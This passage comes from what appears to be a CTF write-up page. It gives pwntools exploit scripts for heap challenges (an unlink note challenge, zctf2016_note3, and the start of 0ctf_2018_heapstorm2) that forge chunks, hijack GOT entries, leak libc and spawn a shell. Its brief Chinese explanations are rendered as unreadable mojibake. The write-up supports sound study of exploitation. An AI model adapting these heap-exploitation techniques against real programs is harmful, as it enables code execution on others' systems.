</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>choice</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;]&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>choice</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>,</span><span class=s1>&#39;merc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;address:&#39;</span><span class=p>,</span><span class=s1>&#39;privacy&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ptr</span> <span class=o>=</span> <span class=mh>0x602120</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>ptr</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>ptr</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 1,0x20</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># padding,prev_size=0x20+0x80,PREV_IN_USE=0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span><span class=mh>0xa0</span><span class=p>,</span><span class=mh>0x90</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;is&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=zctf2016_note3 class="relative group">zctf2016_note3 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#zctf2016_note3 aria-label=é”šç‚¹>#</a></span></h3><p>è¿™é¢˜å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œä¸è¿‡ bss ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p><pre tabindex=0><code>current_ptr
note0_ptr
note1_ptr
note2_ptr
note3_ptr
note4_ptr
note5_ptr
note6_ptr
note7_ptr
note0_size
note1_size
note2_size
note3_size
note4_size
note5_size
note6_size
note7_size
</code></pre><p>æœ¬é¢˜æ¼æ´åœ¨äº <code>edit</code> æ—¶ä¼šåˆ¤æ–­è¾“å…¥çš„é•¿åº¦æ˜¯å¦å°äº 0ï¼Œå¦‚æœæ˜¯å°±å–ç›¸åæ•°ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ•´æ•°æº¢å‡ºï¼Œè¾“å…¥ <code>0x8000000000000000</code>ï¼Œå®ƒçš„ç›¸åæ•°æ°å¥½æ˜¯å®ƒè‡ªèº«ï¼Œå¹¶ä¸”ä¾ç„¶æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼ˆ-1ï¼‰ã€‚è¿™æ ·å°±é€ æˆæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¦†ç›–åˆ° <code>current_ptr</code>ã€‚</p><p>æˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆè®© <code>current_ptr</code> æŒ‡å‘ <code>note3</code>ï¼Œç„¶ååˆ©ç”¨è¶Šç•Œè¦†ç›–ä¸€ä¸ª <code>fake_chunk</code> åˆ° <code>note3</code> ä¸Šï¼Œå†é‡Šæ”¾ <code>note4</code> è§¦å‘ unlinkï¼Œæ­¤æ—¶ <code>note3_ptr</code> æŒ‡å‘ <code>note0_ptr</code>ï¼Œè¿™æ ·å°±å¯ä»¥å®ç° GOT åŠ«æŒã€‚</p><p>ä½†æ˜¯æœ¬é¢˜çš„ <code>show</code> åŠŸèƒ½è¢«ç¦ç”¨ï¼Œè€Œæˆ‘ä»¬è¿˜éœ€è¦æ³„éœ² libc åœ°å€ã€‚è¿™é‡Œç”¨çš„æ–¹æ³•æ˜¯åœ¨ bss æ®µç©ºä½™å¤„å†™å…¥ <code>%llx.</code>ï¼Œç„¶åæŠŠ <code>free</code> å…ˆåŠ«æŒåˆ° <code>printf</code>ï¼Œå»æ‰“å°è¿™ä¸€æ®µæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç›¸å½“äºæ‰‹åŠ¨é€ äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚è¿™æ ·å°±å¯ä»¥æ³„éœ²æ ˆä¸Šå†…å®¹ï¼Œä»è€Œæ³„éœ²ä½äºæ ˆä¸Šçš„ <code>__libc_start_main_ret</code> åœ°å€ï¼ˆä¸€èˆ¬ä½äºåç§»é‡ 11 å¤„ï¼‰ã€‚æœ€åæ³„éœ² libc å¾—åˆ° <code>system</code> åœ°å€ï¼Œè¦†ç›– <code>atoi</code> å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;1024)&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>negative</span> <span class=o>=</span> <span class=mh>0x8000000000000000</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=mh>0x6020c8</span><span class=o>+</span><span class=mh>0x8</span><span class=o>*</span><span class=mi>3</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=mh>0x6020c8</span><span class=o>+</span><span class=mh>0x8</span><span class=o>*</span><span class=mi>3</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x201</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_chunk</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span><span class=mh>0x210</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=o>-</span><span class=n>negative</span><span class=p>,</span><span class=n>fake_chunk</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>])</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bss_blank</span> <span class=o>=</span> <span class=mh>0x602100</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>bss_blank</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;%llx.&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lsmr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;success&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)[</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>lsmr</span><span class=p>,</span><span class=s1>&#39;__libc_start_main_ret&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=0ctf_2018_heapstorm2 class="relative group">0ctf_2018_heapstorm2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#0ctf_2018_heapstorm2 aria-label=é”šç‚¹>#</a></span></h3><p>åˆ†æå…ˆå’•äº†ï¼Œç­‰å®Œå…¨ç†è§£äº†å†è¡¥å……ã€‚å…ˆæ”¾ä¸€äº›å‚è€ƒçš„ wpï¼š</p><ul><li><a href=http://eternalsakura13.com/2018/04/03/heapstorm2/ target=_blank rel=noreferrer>wp1</a></li><li><a href=https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/ target=_blank rel=noreferrer>wp2</a></li><li><a href=https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md target=_blank rel=noreferrer>wp3</a></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Size:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Size:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pos1</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;]: &#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;]: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pos2</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>1.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span><span class=p>[</span><span class=n>pos1</span><span class=p>:</span><span class=n>pos2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x508</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x4f0</span><span class=p>,</span><span class=mh>0x500</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 3</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x508</span><span class=p>)</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 5</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x4f0</span><span class=p>,</span><span class=mh>0x500</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x18</span><span class=o>-</span><span class=mi>12</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4d8</span><span class=p>)</span> <span class=c1># 7</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x38</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4e8</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x18</span><span class=o>-</span><span class=mi>12</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4d8</span><span class=p>)</span> <span class=c1># 8</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x48</span><span class=p>)</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4e8</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>storage</span> <span class=o>=</span> <span class=mh>0x13370800</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>storage</span><span class=o>-</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x4f1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x4e1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=o>-</span><span class=mh>0x18</span><span class=o>-</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Try again?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x13377331</span><span class=p>,</span><span class=n>storage</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x13377331</span><span class=p>,</span><span class=n>storage</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>storage</span><span class=o>-</span><span class=mh>0x20</span><span class=o>+</span><span class=mi>3</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
